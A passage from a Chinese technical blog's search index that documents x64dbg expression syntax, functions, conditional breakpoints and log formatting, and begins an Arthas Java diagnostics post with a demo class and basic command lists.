","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:1:0","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"数字 默认情况下,所有数字都解释为16进制,也可以在值前加x或0x作为前缀来表明该数值为16进制. 如果想要该数字解释为10进制,可以在数字前面加一个点: .123 = 7B ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:1:1","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"变量 变量可以选择以$开头,并且只能存储一个DWORD(在x64上为QWORD).这意味着myvar和$myvar是等同的. ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:1:2","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"寄存器 除浮点寄存器外的所有寄存器(如RAX、EAX、AL)都可以用作变量. 像XMM0、YMM0以及ST(0)这样的浮点寄存器不能用作变量使用,但它们可以通过字符串格式的浮点类型进行记录.目前不支持AVX-512寄存器. 注意 除以下寄存器外,大多数寄存器的变量名称和它们的名称相同 x86控制字标志被命名为_x87CW_UM 除架构中的寄存器外,x64Dbg还提供了以下寄存器:CAX、CBX、CCX、CDX、CSP、CBP、CSI、CDI、CIP.这些寄存器在32位平台上映射为32位寄存器,在64位平台上映射为64位寄存器 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:1:3","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"标志 调试标志可以作为输入,在标志名称前加_即为有效输入.示例如下: _cf、_pf、_af、_zf、_sf、_tf、_if、_df、_of、_rf、_vm _ac、_vif、_vip以及_id ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:1:4","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"内存位置 可以使用以下表达式对内存位置进行读取或写入. 语法 含义 [addr] 从addr指向的内存读取4或8字节内容 n:[addr] 从addr指向的内存读取n字节内容 seg:[addr] 从addr的段读取DWORD或QWORD大小内容 byte:[addr] 从addr指向的内存读取1字节内容 word:[addr] 从addr指向的内存读取2字节内容 dword:[addr] 从addr指向的内存读取4字节内容 qword:[addr] 从addr指向的内存读取8字节内容 注意 n是要读取的字节数,在x32上应小于4,在x64上应小于8,否则会出错 seg可以是gs、es、cs、fs、ds以及ss.只有fs和gs有效 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:1:5","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"标签/符号 用户定义的标签和符号是一个有效的表达式(它们解析到所述标签/符号的地址). ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:1:6","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"DLL导出 从指定模块获取API地址可以使用module.dll:api、module:api或module:ordinal ntdll.dll:ZwContinue ntdll:memcmp ntdll.memcmp ntdll:1D :LuoExport 注意 当module为空字符串时,将默认为当前CPU窗口显示的模块 使用.或:是等价的 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:1:7","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"模块基地址 可以使用下述命令来获取模块的基地址. module、module:0、module:base、module:imagebase、module:header ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:1:8","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"RVA/文件偏移 RVA-\u003eVA:module+rva或module:$rva FOA-\u003eVA:module:#offset //RVA-\u003eVA ntdll.dll:$1000 :$1000 //FOA-\u003eVA ntdll.dll:#400 :#400 注意 当module为空字符串时(如:$1000),默认为当前CPU窗口显示的模块 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:1:9","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"模块入口点 可以使用下述命令来获取模块的入口点. module:entry、module:oep、module:ep 注意 当模块中有名为entry、oep或ep时,将返回这个导出函数的地址. ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:1:10","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"表达式 调试器允许使用基本表达式.除了计算之外,还允许使用类C语法进行变量赋值. ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:2:0","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"运算符 圆括号/方括号:(1+2),[1+6]比其他运算有优先权 一元负号/二进制非/逻辑非:-1,~1,!1 乘法/除法:2*3,6/3,5%3 加法/减法:1+3,5+2 左/右移动/轮换:1«2,10»1,1«\u003c2,1»\u003e2 小于(等于)/大于(等于):4\u003c10,3\u003e6,1\u003c=2,6\u003e=7 等于/不等于:1==1,2!=6 二进制与:12\u00262 二进制异或:2^1 二进制或:2|8 逻辑与:0\u0026\u00263 逻辑或:0||3 逻辑隐含:0-\u003e1 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:2:1","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"快速赋值 更改内存、变量、寄存器或标志. a?=b:?可以是任何非逻辑运算符.a可以是任何寄存器、标志、变量或内存位置.b可以是被确定为表达式的任何东西. a++/a–:a可以是任何寄存器、标志、变量或内存位置. ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:2:2","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"表达式函数 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:3:0","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"字符串 语法 含义 示例命令 结果 ansi(addr[, count]) 从addr打印以空字符结尾的ANSI字符串.当count指定时,字符串将被截断. log “{ansi(0x402000,10)}” Hello XiaLuoHun! utf8(addr[, count]) 从addr打印以空字符结尾的UTF-8字符串.当count指定时,字符串将被截断. log “{utf8(0x402000)}” Hello XiaLuoHun! utf16(addr[, count]) 从addr打印以空字符结尾的UTF-16字符串.当count指定时,字符串将被截断. log “{utf16(0x405000,2)}” He strstr(str1, str2) 查找子字符串 log “{strstr(utf8(0x402000),“Luo”)}” 1 streq(str1, str2) 比较两个字符串 log “{streq(utf8(0x402000),“Luo”)}” 0 strlen(str) 计算字符串的长度 log “{strlen(utf8(0x402000))}” 10 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:3:1","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"模块 语法 含义 mod.party(addr) 获取addr的模块编号.0表示用户模块,1表示系统模块 mod.base(addr) 获取addr模块基址 mod.size(addr) 获取addr模块大小 mod.hash(addr) 获取addr模块Hash mod.entry(addr) 获取addr模块入口 mod.system(addr) 判断addr是属于系统模块.若是返回1,否则返回0 mod.user(addr) 判断addr是属于用户模块.若是返回1,否则返回0 mod.main() 获取主模块基地址 mod.rva(addr) 获取addr所属模块的RVA.若地址不在模块中,返回0 mod.offset(addr) 获取addr的文件偏移量.若地址不在模块中,返回0 mod.isexport(addr) 判断addr是否是模块导出函数.若是返回1 mod.fromname(str) 获取str模块基址 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:3:2","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"进程信息 语法 含义 peb() 获取PEB地址 teb() 获取TEB地址 tid() 获取当前线程ID kusd(),KUSD(),KUSER_SHARED_DATA() 获取KUSER_SHARED_DATA结构地址 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:3:3","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"常规函数 语法 含义 示例命令 结果 bswap(value) 反转字节 log “{bswap(0x12345678)}” 78563412 ternary(condition, val1, val2) 如果条件为真, 返回val1,否则返回val2 log “{ternary(0,1,2)}” 2 GetTickCount() 获取从操作系统启动所经过的毫秒数 log “{GetTickCount()}” 121A1D0 rdtsc() 获取RDTSC指令结果,该指令返回CPU自启动以来的时钟周期数 log “{rdtsc()}” 5C51E17C isdebuggerfocused() 判断是否聚焦x64dbg.若是返回1,否则返回0 log “{isdebuggerfocused()}” 1 isdebuggeefocused() 判断是否聚焦调试程序.若是返回1,否则返回0 log “{isdebuggeefocused()}” 0 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:3:4","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"内存 语法 含义 mem.valid(addr) 判断addr是否有效.若是返回1,否则返回0 mem.base(addr) 获取addr内存页的基地址 mem.size(addr) 获取addr内存页的大小 mem.iscode(addr) 判断addr是否是可执行页面.若是返回1,否则返回0 mem.decodepointer(ptr) 调用了API DecodePointer ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:3:5","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"反汇编 语法 含义 dis.len(addr) 获取addr指令长度 dis.iscond(addr) 判断addr处是否为条件指令(JCC).若是返回1,否则返回0 dis.isbranch(addr) 判断addr处是否为分支指令(JCC/CALL).同上 dis.isret(addr) 判断addr处是否为RET指令.同上 dis.iscall(addr) 判断addr处是否为CALL指令.同上 dis.ismem(addr) 判断addr处指令是否有内存操作数.同上 dis.isnop(addr) 判断addr处是为NOP指令.同上 dis.isunusual(addr) 判断addr处是为异常指令.同上 dis.branchdest(addr) 获取addr处的分支目标地址(即在addr处按下Enter键后的地址) dis.branchexec(addr) 判断addr处分支是否执行.若是返回1,否则返回0 dis.imm(addr) 获取addr处指令中的立即数 dis.brtrue(addr) 获取addr处的分支目标地址 dis.brfalse(addr) 如果addr处是条件跳转指令则返回下一条指令地址,否则返回0 dis.next(addr) 获取addr处下一条指令地址 dis.prev(addr) 获取addr处前一条指令地址 dis.iscallsystem(addr) 判断addr处的指令是否进入系统模块.如是返回1,否则返回0 dis.mnemonic(addr) 返回addr处指令的助记符(str).可以和字符串表达式函数配合使用,如str.streq(dis.mnemonic(cip), “cpuid”) dis.text(addr) 获取addr处的指令文本 dis.match(addr, str) 判断addr处指令是否匹配正则表达式str.如是返回1,否则返回0 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:3:6","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"跟踪 语法 含义 tr.enabled(addr) 判断addr是否启用了跟踪覆盖.如是返回1,否则返回0 tr.hitcount(addr) 判断addr是否已被跟踪覆盖.同上 tr.isrecording(),tr.runtraceenabled() 判断是否启用跟踪记录.同上 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:3:7","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"内存指针 语法 含义 ReadByte(addr),Byte(addr),byte(addr) 从addr读取1字节并返回 ReadWord(addr),Word(addr),word(addr) 从addr读取2字节并返回 ReadDword(addr),Dword(addr),dword(addr) 从addr读取4字节并返回 ReadQword(addr),Qword(addr),qword(addr) 从addr读取8字节并返回(仅限x64) ReadPtr(addr),ReadPointer(addr),ptr(addr),Pointer(addr),pointer(addr) 从addr读取一个指针(4/8字节)并返回 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:3:8","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"函数 语法 含义 func.start(addr) 获取addr所在的函数头地址 func.end(addr) 获取addr所在的函数尾地址 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:3:9","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"引用 语法 含义 ref.count() 获取当前引用视图中的条目数 ref.addr(index) 获取index引用的地址 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:3:10","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"参数 假设此时堆栈顶部为返回地址 语法 含义 arg.get(index) 获取第index参数(从0开始) arg.set(index, value) 设置第index处的参数(从0开始) ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:3:11","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"异常 语法 含义 ex.firstchance() 最后一个异常是否为首次偶发异常 ex.addr() 最后一个异常地址.即导致异常的指令地址 ex.code() 最后一个异常代码 ex.flags() 最后一个异常标志 ex.infocount() 最后一个异常信息计数(参数个数) ex.info(index) 最后一个异常信息,如果索引超过范围则为0 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:3:12","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"插件 插件注册表达式示例 _plugin_registerexprfunction _plugin_registerexprfunctionex _plugin_unregisterexprfunction ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:3:13","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"变量 调试器支持以下三种类型的变量: 用户变量:用户通过var/mov创建变量 系统变量:由x64Dbg创建的变量,可读可写,但不能删除 只读变量:由x64Dbg创建的变量,可以读取,但不能写入和删除 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:4:0","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"设置变量 可以通过以下方式进行变量设置 mov myvar, 1234 mov $myvar, 1234 myvar = 1234 $myvar = 1234 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:4:1","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"保留变量 $res/$result:常规结果变量 $resN/$resultN:可选的其他结果变量(N=1-4) $pid:被调试进程的PID $hp/$hProcess:被调试进程的handle $lastalloc:alloc命令的最后结果 $breakpointcondition:控制条件断点命中时的暂停行为 $breakpointcounter:断点命中的次数 $breakpointlogcondition:条件断点的日志条件.它不能用于控制日志记录行为 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:4:2","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"条件断点 当断点命中时,x64Dbg将执行下述操作. 将系统变量$breakpointexceptionaddress设置为触发断点的地址(内存地址) 将命中计数器增加1 将系统变量$breakpointcounter设置为命中计数器的值 如果设置了中断条件,计算表达式的值(默认为1) 如果设置了快速恢复且中断条件为0: 跳过接下来的步骤继续执行被调试对象,这也将跳过执行插件回调和GUI更新 如果设置了日志条件,计算表达式的值(默认为1) 如果设置了命令条件,计算表达式的值(默认为1) 如果中断条件求值结果为1(或非0值): 打印标准日志消息(如果断点设置为静默,则不支持标准日志消息) 执行插件回调 如果设置了日志文本且日志条件表达式求值结果为1(或非0值): 格式化并打印日志文本(参考字符串格式化) 如果设置了命令文本且命令条件表达式求值结果为1(或非0值): 将系统变量$breakpointcondition设置为中断条件 将系统变量$breakpointlogcondition设置为日志条件 执行命令文本 将中断条件设置为$breakpointcondition的值.因此,如果在脚本中修改$breakpointcondition的值,你就能控制调试对象是否被中断 如果中断条件求值结果为1(或非0值): 中断调试对象并等待用户继续执行 如果上述条件表达式无效,则将触发该条件.(即无效的条件表达式作为条件将导致断点始终中断、打印日志以及执行命令) 在平时的调试过程中,命中计数器的值会无条件进行递增,可以调用下述API函数进行重置. //对addr处命中计数器的值进行重置.若hitCount未指定,默认为0 ResetBreakpointHitCount(addr,hitCount) 条件表达式示例如下: //永不中断的条件断点 0 //当EAX和ECX都为1时中断 EAX==1\u0026\u0026ECX==1 //当第一个参数为1时中断 arg.get(0)==1 //当EAX是一个有效地址时中断 mem.valid(EAX) //当命中计算器的值为3时中断 $breakpointcounter==3 //当线程ID为0x1C0时中断 tid()==1C0 //当ECX指向一个包含LuoHun的UTF-16字符串时中断 strstr(utf16(ECX), \"LuoHun\") ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:5:0","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"条件跟踪 当跟踪命中时,x64Dbg将执行下述操作: 将跟踪计数器增加1 将系统变量$tracecounter设置为跟踪计数器的值 如果设置了中断条件,计算表达式的值(默认为0) 执行插件回调(允许插件更改终端条件) 如果设置了日志条件,计算表达式的值(默认为1) 如果设置了命令条件,计算表达式的值(默认为中断条件) 如果设置了日志文本且日志条件表达式求值结果为1: 格式化并打印日志文本(参考字符串格式化).要将日志重定向到文件,请使用TraceSetLogFile 如果设置了命令文本且命令表达式求值结果为1: 将系统变量$tracecondition设置为中断条件 将系统变量$tracelogcondition设置为日志条件 执行命令文本 将中断条件设置为$tracecondition的值.因此,如果在脚本中修改$tracecondition的值,你就能控制调试对象是否被中断 如果中断条件求值为1: 打印标准日志条件 中断调试对象并等待用户继续执行 如果想要通过日志跟踪记录所有指令的地址和汇编,可以使用下述命令 {p:cip} {i:cip} 注意 当使用跟踪步过时,即使条件为真,被调试对象也不会在已跳过的调用中暂停.如果需要暂停应使用跟踪步进 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:6:0","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"字符串格式 基本语法如下: //?是表达式可选的类型 //若要在结果中输出{ 或 },可将它们转义为{{ 或 }} {?:expression} 简单类型如下: 类型 含义 示例命令 结果 d 有符号十进制 log “{d:FFFFFFFF}” -1 u 无符号十进制 log “{u:FFFFFFFF}” 4294967295 p 零前缀指针 log “{p:0x401000}” 00401000 s 字符串指针 log “{s:0x402000}” “Hello XiaLuoHun!” x 十六进制 log “{x:0x10}” 10 a 地址信息 log “{a:0x401000}” x32dbg.00401000 i 输出汇编指令 log “{i:0x405102}” call 0x0040B122 f 单精度浮点指针或寄存器 log “{f:0x401000}” 9.86338 F 双精度浮点指针或寄存器 log “{F:0x401000}” 3.72778552425271e-095 复杂类型如下: 语法 含义 示例命令 结果 {mem;size@address} 从address开始打印size个字节 log “{mem;2@0x400108}” 504A {winerror@code} 输出Windows错误码名称以及描述 log “{winerror@0x5}” ERROR_ACCESS_DENIED:拒绝访问. {ntstatus@code} 输出NTSTATUS错误码名称以及描述 log “{ntstatus@0}” STATUS_SUCCESS:STATUS_SUCCESS {ascii[;length]@address} 以ascii编码进行解析,从address开始打印length个字节 log “{ascii;10@0x00402000}” Hello XiaLuoHun! {ansi[;length]@address} 以ansi编码进行解析,从address开始打印length个字节 log “{ansi;c@0x00402000}” Hello XiaLuo {utf8[;length]@address} 以utf8编码进行解析,从address开始打印length个字节 log “{utf8;10@0x00402000}” Hello XiaLuoHun! {utf16[;length]@address} 以utf16编码进行解析,从address开始打印length个双字节 log “{utf16;2@0x00405000}” He {disasm@address} 输出address处的汇编,同{i:address} log “{disasm@0x405102}” call 0x0040B122 {modname@address} 输出address所属的模块名 log “{modname@0x401000}” x32dbg.exe log “{bswap[;size]@value}” 从value的低位开始倒数打印size个字节 log “{bswap;1@0x12345678}” 78 {label@address} 输出address处的标签 log “{label@0x405102}” OptionalHeader.AddressOfEntryPoint {comment@address} 输出address处的注释 log “{comment@0x405107}” XiaLuoHun ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:7:0","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["x64Dbg"],"content":"参考链接 x64Dbg帮助文档 ","date":"2024-06-17","objectID":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/:8:0","tags":["x64Dbg"],"title":"x64Dbg-命令详解","uri":"/posts/x64dbg/x64dbg-%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" Arthas是一款线上监控诊断产品,通过全局视角实时查看应用load、内存、gc、线程的状态信息,并能在不修改应用代码的情况下,对业务问题进行诊断,包括查看方法调用的出入参、异常,监测方法执行耗时,类加载信息等,大大提升线上问题排查效率. https://github.com/alibaba/arthas ","date":"2024-06-11","objectID":"/posts/java/arthas/:0:0","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"测试代码 package demo; import java.util.ArrayList; import java.util.List; import java.util.Random; import java.util.concurrent.TimeUnit; public class MathGame { private static Random random = new Random(); public int illegalArgumentCount = 0; public static void main(String[] args) throws InterruptedException { MathGame game = new MathGame(); while (true) { game.run(); TimeUnit.SECONDS.sleep(1); } } public void run() throws InterruptedException { try { int number = random.nextInt()/10000; List\u003cInteger\u003e primeFactors = primeFactors(number); print(number, primeFactors); } catch (Exception e) { System.out.println(String.format(\"illegalArgumentCount:%3d, \", illegalArgumentCount) + e.getMessage()); } } public static void print(int number, List\u003cInteger\u003e primeFactors) { StringBuffer sb = new StringBuffer(number + \"=\"); for (int factor : primeFactors) { sb.append(factor).append('*'); } if (sb.charAt(sb.length() - 1) == '*') { sb.deleteCharAt(sb.length() - 1); } System.out.println(sb); } public List\u003cInteger\u003e primeFactors(int number) { if (number \u003c 2) { illegalArgumentCount++; throw new IllegalArgumentException(\"number is: \" + number + \", need \u003e= 2\"); } List\u003cInteger\u003e result = new ArrayList\u003cInteger\u003e(); int i = 2; while (i \u003c= number) { if (number % i == 0) { result.add(i); number = number / i; i = 2; } else { i++; } } return result; } } ","date":"2024-06-11","objectID":"/posts/java/arthas/:1:0","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"附加进程 启动Demo 执行arthas-boot.jar进行附加 java -jar arthas-boot.jar 如果提示端口被占用,可以使用下述命令进行端口自定义. java -jar arthas-boot.jar --telnet-port 9998 --http-port -1 如果附加成功,Arthas会在下述目录进行日志记录. %HOMEPATH%/logs/arthas 通过浏览器连接Arthas Arthas目前支持Web Console,用户在attach成功之后,可以直接访问:http://127.0.0.1:3658/ 默认情况下,Arthas只listen 127.0.0.1,所以如果想从远程连接,则可以使用–target-ip参数指定listen的IP ","date":"2024-06-11","objectID":"/posts/java/arthas/:2:0","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"基础命令 基础命令 说明 base64 base64编码转换.同Linux base64 cat 打印文件内容.同Linux cat cls 清空当前屏幕区域 echo 打印参数.同Linux echo grep 匹配查找.同Linux grep help 查看命令帮助信息 history 打印命令历史 keymap 显示所有的快捷键 pwd 显示当前的工作路径.同Linux pwd quit 退出当前Arthas客户端,其他Arthas客户端不受影响 reset 重置增强类,将被Arthas增强过的类全部还原,Arthas服务端关闭时会重置所有增强过的类 session 查看当前会话信息 stop 关闭Arthas服务端,所有Arthas客户端全部退出 tee 复制标准输入到标准输出和指定的文件.同Linux tee version 输出当前目标Java进程所加载的Arthas版本号 ","date":"2024-06-11","objectID":"/posts/java/arthas/:3:0","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"JVM命令 jvm相关命令 说明 dashboard 当前系统的实时数据面板 getstatic 查看类的静态属性 heapdump dump java heap,类似jmap命令的heap dump功能 jvm 查看JVM信息 logger 查看和修改logger mbean 查看Mbean信息 memory 查看JVM的内存信息 ognl 执行ognl表达式 perfcounter 查看当前JVM的Perf Counter信息 sysenv 查看JVM的环境变量 sysprop 查看和修改JVM系统属性 thread 查看当前JVM线程堆栈信息 vmoption 查看和修改JVM里诊断相关的option vmtool 从jvm里查询对象,执行forceGc ","date":"2024-06-11","objectID":"/posts/java/arthas/:4:0","tags":["Java"],"title":"Arthas","uri":"/posts/java/arthas/"},{"categories":["Java"],"content":"Class/Classloader命令 类，类加载相关的命令 